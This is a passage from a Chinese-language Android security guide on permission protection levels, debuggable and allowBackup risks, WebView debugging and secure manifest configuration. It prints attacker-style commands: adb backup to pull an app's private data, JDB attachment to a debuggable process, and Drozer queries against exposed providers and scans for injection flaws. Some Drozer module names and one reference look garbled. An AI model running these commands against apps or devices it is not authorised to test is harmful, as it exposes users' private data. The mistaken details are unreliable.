    android:exported="true"
    android:permission="com.example.permission.ACCESS_PREMIUM" />

<!-- 其他应用声明使用权限 -->
<!-- <uses-permission android:name="com.example.permission.ACCESS_PREMIUM" /> -->
```

### 7.2 运行时权限

```java
// 运行时请求权限
if (ContextCompat.checkSelfPermission(this,
        Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) {
    ActivityCompat.requestPermissions(this,
        new String[]{Manifest.permission.READ_CONTACTS},
        REQUEST_CODE_CONTACTS);
}

@Override
public void onRequestPermissionsResult(int requestCode,
        String[] permissions, int[] grantResults) {
    super.onRequestPermissionsResult(requestCode, permissions, grantResults);
    if (requestCode == REQUEST_CODE_CONTACTS) {
        if (grantResults.length > 0 && grantResults[0] == PackageManager.PERMISSION_GRANTED) {
            // 权限已授予
            loadContacts();
        } else {
            // 权限被拒绝
            showPermissionDeniedMessage();
        }
    }
}
```

### 7.3 权限保护级别

| 保护级别 | 说明 | 安全性 |
|----------|------|--------|
| normal | 安装时自动授予 | 最低 |
| dangerous | 运行时请求用户授权 | 中 |
| signature | 仅同签名应用可获授权 | 高 |
| signatureOrSystem | 同签名或系统应用 | 最高 |

**最佳实践**

```xml
<!-- 敏感组件使用signature级别权限 -->
<permission
    android:name="com.example.permission.ADMIN_ACCESS"
    android:protectionLevel="signature" />

<activity
    android:name=".AdminActivity"
    android:exported="true"
    android:permission="com.example.permission.ADMIN_ACCESS" />
```

---

## 八、ADB调试风险

### 8.1 debuggable属性

`android:debuggable`属性控制应用是否可被调试。调试状态下应用面临严重安全风险：

```xml
<!-- AndroidManifest.xml -->
<application
    android:debuggable="true">  <!-- 发布版本必须为false -->
```

**调试模式风险**

- ADB可以连接到应用进程
- 可以注入代码、读取内存
- 可以修改运行时变量
- DDMMS可以读取日志中的敏感信息
- 可以使用JDB设置断点

**风险检测**

```bash
# 检查APK是否可调试
apkanalyzer manifest print app.apk | grep debuggable

# 使用adb连接调试
adb shell am set-debug-app -w com.example.app
adb shell am set-debug-app --persistent com.example.app

# 使用JDB调试
adb forward tcp:8700 jdwp
jdb -attach localhost:8700
```

**防御措施**

```xml
<!-- 发布版本设置debuggable=false -->
<application
    android:debuggable="false"
    android:allowBackup="false">

    <!-- 在build.gradle中确保release构建 -->
</application>
```

```gradle
// build.gradle
android {
    buildTypes {
        release {
            debuggable false
            // 其他安全配置
            minifyEnabled true
            shrinkResources true
            proguardFiles getDefaultProguardFile('proguard-android.txt'),
                          'proguard-rules.pro'
            signingConfig signingConfigs.release
        }
        debug {
            debuggable true
        }
    }
}
```

### 8.2 备份风险

`android:allowBackup`允许通过adb backup备份应用数据：

```xml
<!-- 危险：允许备份 -->
<application android:allowBackup="true">
```

```bash
# 攻击者通过adb备份应用数据
adb backup -f app_backup.ab -noapk com.example.app
# 备份文件包含SharedPreferences、数据库等敏感数据

# 解压备份文件
dd if=app_backup.ab bs=1 skip=24 | zlib-flate -uncompress | tar xf -
```

**防御措施**

```xml
<application android:allowBackup="false">
```

### 8.3 WebView调试风险

```java
// 不安全：在发布版本中启用WebView调试
if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.KITKAT) {
    WebView.setWebContentsDebuggingEnabled(true);  // 发布版本不应启用
}

// 安全：仅调试版本启用
if (BuildConfig.DEBUG) {
    WebView.setWebContentsDebuggingEnabled(true);
}
```

---

## 九、组件安全最佳实践

### 9.1 最小暴露原则

| 原则 | 说明 |
|------|------|
| 默认不暴露 | exported="false"为默认值 |
| 必须暴露时加权限 | 使用permission属性 |
| 优先signature级别 | 仅同签名应用可访问 |
| 精确指定target | Intent.setPackage()或显式Intent |
| 不暴露内部组件 | 只暴露必要的入口组件 |

### 9.2 输入验证

```java
// 验证Intent来源
private boolean validateCaller() {
    int callingUid = Binder.getCallingUid();
    int callingPid = Binder.getCallingPid();

    // 获取调用者包名
    String[] packages = getPackageManager().getPackagesForUid(callingUid);
    if (packages == null || packages.length == 0) {
        return false;
    }

    // 白名单检查
    Set<String> trustedPackages = new HashSet<>(Arrays.asList(
        "com.example.app",
        "com.example.partner"
    ));

    for (String pkg : packages) {
        if (trustedPackages.contains(pkg)) {
            // 进一步验证签名
            return verifySignature(pkg);
        }
    }
    return false;
}

private boolean verifySignature(String packageName) {
    try {
        PackageInfo pkgInfo = getPackageManager().getPackageInfo(
            packageName, PackageManager.GET_SIGNATURES);
        Signature callerSig = pkgInfo.signatures[0];
        Signature mySig = getPackageManager().getPackageInfo(
            getPackageName(), PackageManager.GET_SIGNATURES).signatures[0];
        return callerSig.equals(mySig);
    } catch (Exception e) {
        return false;
    }
}
```

### 9.3 安全配置清单

```xml
<!-- AndroidManifest.xml 安全配置模板 -->
<manifest xmlns:android="http://schemas.android.com/apk/res/android"
    package="com.example.app">

    <!-- 最小权限原则 -->
    <uses-permission android:name="android.permission.INTERNET" />

    <!-- 定义自定义权限 -->
    <permission
        android:name="com.example.permission.INTERNAL"
        android:protectionLevel="signature" />

    <uses-permission android:name="com.example.permission.INTERNAL" />

    <application
        android:debuggable="false"
        android:allowBackup="false"
        android:usesCleartextTraffic="false"
        android:networkSecurityConfig="@xml/network_security_config">

        <!-- 安全的Activity配置 -->
        <activity
            android:name=".MainActivity"
            android:exported="true">
            <intent-filter>
                <action android:name="android.intent.action.MAIN" />
                <category android:name="android.intent.category.LAUNCHER" />
            </intent-filter>
        </activity>

        <activity
            android:name=".InternalActivity"
            android:exported="false" />

        <activity
            android:name=".AdminActivity"
            android:exported="true"
            android:permission="com.example.permission.INTERNAL" />

        <!-- 安全的Service配置 -->
        <service
            android:name=".BackgroundService"
            android:exported="false" />

        <service
            android:name=".BoundService"
            android:exported="true"
            android:permission="com.example.permission.INTERNAL" />

        <!-- 安全的Receiver配置 -->
        <receiver
            android:name=".InternalReceiver"
            android:exported="false" />

        <receiver
            android:name=".ExternalReceiver"
            android:exported="true"
            android:permission="com.example.permission.INTERNAL">
            <intent-filter>
                <action android:name="com.example.action.EXTERNAL" />
            </intent-filter>
        </receiver>

        <!-- 安全的Provider配置 -->
        <provider
            android:name=".DataProvider"
            android:authorities="com.example.provider"
            android:exported="false"
            android:grantUriPermissions="false" />

        <provider
            android:name=".ShareProvider"
            android:authorities="com.example.share"
            android:exported="true"
            android:readPermission="com.example.permission.INTERNAL"
            android:writePermission="com.example.permission.INTERNAL"
            android:grantUriPermissions="true">
            <grant-uri-permission android:pathPattern="/public/.*" />
        </provider>
    </application>
</manifest>
```

```xml
<!-- res/xml/network_security_config.xml -->
<?xml version="1.0" encoding="utf-8"?>
<network-security-config>
    <base-config cleartextTrafficPermitted="false">
        <trust-anchors>
            <certificates src="system" />
        </trust-anchors>
    </base-config>
    <domain-config cleartextTrafficPermitted="false">
        <domain includeSubdomains="true">api.example.com</domain>
        <pin-set expiration="2026-12-31">
            <pin digest="SHA-256">abcdef1234567890...</pin>
            <pin digest="SHA-256">backup1234567890...</pin>
        </pin-set>
    </domain-config>
</network-security-config>
```

### 自动化检测工具

**使用Drozer检测组件安全**

```bash
# 安装Drozer
pip3 install drozer

# 连接设备
drozer console connect

# 列出所有暴露的组件
dz> run app.activity.broadcast
dz> run app.activity.service
dz> run app.activity.provider

# 查找暴露的Activity
dz> run app.activity.info -a com.example.app

# 尝试启动暴露的Activity
dz> run app.activity.start --component com.example.app com.example.app.AdminActivity

# 查找暴露的Provider
dz> run app.provider.info -a com.example.app

# 查询Provider数据
dz> run app.provider.query content://com.example.provider/users

# 检测SQL注入
dz> run scanner.provider.injection -a com.example.app

# 检测路径遍历
dz> run scanner.provider.traversal -a com.example.app
```

**使用MobSF自动化检测**

```bash
# 静态分析
mobsf analyze app.apk --type static

# 检查组件暴露
# 检查exported属性
# 检查权限保护
# 检查Intent安全
# 检查debuggable
# 检查allowBackup
```

---

> **参考资源**
>
> - Android Security Guidelines - developer.android.com
> - OWASP Mobile Security Testing Guide
> - Drozer Documentation - github.com/fuzzdb/drozer
> - Android Security Internals - Nikolay Elenkov
> - CVE Details for Android Vulnerabilities
